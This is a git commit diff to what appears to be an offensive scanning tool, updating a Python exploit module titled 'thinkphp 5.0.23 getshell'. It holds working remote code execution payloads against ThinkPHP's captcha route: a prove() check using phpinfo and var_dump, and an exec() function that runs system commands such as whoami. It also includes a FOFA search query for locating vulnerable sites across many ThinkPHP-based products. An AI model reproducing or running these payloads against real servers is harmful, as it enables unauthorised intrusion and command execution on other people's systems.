15b07753b888a769ca891c80464cdcf84d36d6c4
orleven <546577246@qq.com>
2019-01-12 01:08:23 +0800

    thinkphp 5.0.23 getshell

--- script/__init__.py
+++ script/__init__.py
@@ -66,13 +66,13 @@ def init(data,service='web'):
         data['private_key'] = private_key
 
     # socket proxy
-    if conf['config']['proxy']['proxy'].lower() == 'true':
-        try:
-            socks5_host, socks5_port = conf['config']['proxy']['socks5'].split(':')
-            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, socks5_host, int(socks5_port))
-            socket.socket = socks.socksocket
-        except Exception as e:
-            logger.error("Error socket proxy: %s" % conf['config']['proxy']['socks5'])
+    # if conf['config']['proxy']['proxy'].lower() == 'true':
+    #     try:
+    #         socks5_host, socks5_port = conf['config']['proxy']['socks5'].split(':')
+    #         socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, socks5_host, int(socks5_port))
+    #         socket.socket = socks.socksocket
+    #     except Exception as e:
+    #         logger.error("Error socket proxy: %s" % conf['config']['proxy']['socks5'])
     socket.setdefaulttimeout(int(conf['config']['basic']['timeout']))
     return data
 
--- script/thinkphp/thinkphp5023_getshell.py
+++ script/thinkphp/thinkphp5023_getshell.py
@@ -4,15 +4,15 @@
 from urllib import parse
 
 '''
-open debug mode
+
 
 fofa :
  "( app=\"ThinkSNS\")||( app=\"eyoucms\")||( app=\"Onethink\")||( app=\"TPshop\")||( body=\"/admin/login/checkverify.html?tm=\" || body=\"snake后台登录\")||( title=\"基于ThinkPHP5和Bootstrap的极速后台开发框架\" || title=\"fastadmin\" || body=\"fastadmin.net\")||( body=\"class=\\\"verifyimg reload-verify\\\"\" && body=\"class=\\\"panel-lite\\\"\" && body=\"lyui\")||( body=\"/public/static/admin/css/dolphin.css\" || body=\"/admin.php/user/publics/signin.html\" || body=\"/public/static/admin/js/dolphin.js\")||( body=\"/public/static/dist/img/logo.png\" || body=\"/Public/Admin/dist/img/logo.png\" || body=\"Powered by WeMall\")||( app=\"layui\")||( body=\"/css/AdminLTE.css\" || body=\"/css/AdminLTE.min.css\")||( body=\"yuan1994\" && body=\"/static/admin/h-ui/css/H-ui.min.css\"&& body=\"href=\\\"/static/admin/h-ui.admin/css/H-ui.login.css\\\"\")||( body=\"/admin/publics/index.html\" && body=\"login-head\")||( body=\"/haoidcn/Admin/Public\")||( body=\"/css/H-ui.min.css\" || body=\"/css/H-ui.login.css\" || body=\"/h-ui.admin/\")||( title=\"Tplay\" || ( body=\"Tplay\" && body=\"layui\"))||( body=\"/public/static/js/qibo.js\" || body=\"qb_ui.css\")||( body=\"/public/static/css/pc_reset.css\" || body=\"/public/static/css/qb_ui.css\")||( body=\"/css/AdminLTE.css\" || body=\"/css/AdminLTE.min.css\")||( body=\"YFCMF\" && body=\"/public/others/maxlength.js\" || body=\"/yfcmf/yfcmf.js\")||( body=\"/home/memberorder/index.html\" || body=\"/home/showjoinin/index.html\")||( body=\"http://www.cltphp.com/\" || body=\"this.src='/user/login/verify.html?'+'id='+Math.random()\")||\"ThinkPHP5\"|| app=\"ThinkPHP\""
 '''
 def info(data):
     info = {
-        "name": "thinkphp 5 debug getshell",
-        "info": "thinkphp 5 debug getshell",
+        "name": "thinkphp 5.0.23 getshell",
+        "info": "thinkphp 5.0.23 getshell",
         "level": "high",
         "type": "sql",
     }
@@ -21,31 +21,35 @@ def info(data):
 def prove(data):
     init(data,'thinkphp')
     if data['base_url']:
-        # headers['Content-Type'] = 'application/x-www-form-urlencoded'
-        pocpath = 'index.php?s=captcha'
-        poc = '_method=__construct&method=get&filter[]=phpinfo&server[REQUEST_METHOD]=1'
-        for path in ['public/']:
-            url = data['base_url'] + path + pocpath
-            res = curl('post', url, data=poc)
-            if res != None and 'PHP Version' in res.text:
-                data['flag'] = 1
-                data['data'].append({"flag": url})
-                data['res'].append({"info": url, "key": "thinkphp 5 debug getshell"})
-                break
+        headers ={}
+        headers['Content-Type'] = 'application/x-www-form-urlencoded'
+        for path in ['public/','']:
+            for poc in ['_method=__construct&method=get&filter[]=phpinfo&server[REQUEST_METHOD]=1',
+                        '_method=__construct&method=get&filter[]=var_dump&server[REQUEST_METHOD]=this_is_a_test']:
+                url = data['base_url'] + path + 'index.php?s=captcha'
+                res = curl('post', url, data=poc,headers=headers)
+                if res != None :
+                    if 'PHP Version' in res.text or 'string(14) "this_is_a_test"' in res.text:
+                        data['flag'] = 1
+                        data['data'].append({"flag": url})
+                        data['res'].append({"info": url, "key": "thinkphp 5.0.23 getshell"})
+                        break
     return data
 
 def exec(data):
     init(data,'web')
     if data['base_url']:
-        pocpath = 'index.php?s=captcha'
-        poc = '_method=__construct&method=get&filter[]=system&server[REQUEST_METHOD]='+data['cmd']
-        for path in ['','public/']:
-            url = data['base_url'] + path + pocpath
-            res = curl('get', url, data = poc)
-            if res != None and res.status_code == 200:
-                data['flag'] = 1
-                data['data'].append({"flag": url})
-                data['res'].append({"info": res.text, "key": "thinkphp 5 debug getshell"})
+        headers ={ }
+        headers['Content-Type'] = 'application/x-www-form-urlencoded'
+        poc = '_method=__construct&method=get&filter[]=system&server[REQUEST_METHOD]=whoami'
+        for path in ['public/','']:
+            for pocpath in ['index.php?s=captcha']:
+                url = data['base_url'] + path + pocpath
+                res = curl('post', url, data = poc,headers=headers)
+                if res != None and res.status_code == 500:
+                    data['flag'] = 1
+                    data['data'].append({"flag": url})
+                    data['res'].append({"info": res.text, "key": "thinkphp 5.0.23 getshell"})
     return data
 
 if __name__=='__main__':
